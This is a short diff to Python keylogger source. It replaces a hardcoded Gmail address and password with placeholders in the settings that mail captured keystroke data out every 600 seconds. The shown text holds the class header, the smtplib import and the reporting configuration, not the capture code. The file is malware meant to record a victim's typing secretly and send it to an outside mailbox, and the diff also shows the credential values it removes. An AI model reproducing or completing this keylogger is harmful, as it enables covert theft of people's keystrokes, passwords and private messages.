@@ -3,8 +3,8 @@ import smtplib # for mail
 from threading import Semaphore, Timer #for blocking
 
 SEND_REPORT_EVERY = 600 #time in seconds after which the program send the mail with the data
-EMAIL_ADDRESS = "a.random.test.mail@gmail.com" #mail id for sending and receiving the data 
-EMAIL_PASSWORD = "test@mail"
+EMAIL_ADDRESS = "example@something.com" #mail id for sending and receiving the data 
+EMAIL_PASSWORD = "password"
 
 class Keylogger:
     def __init__(self, interval):
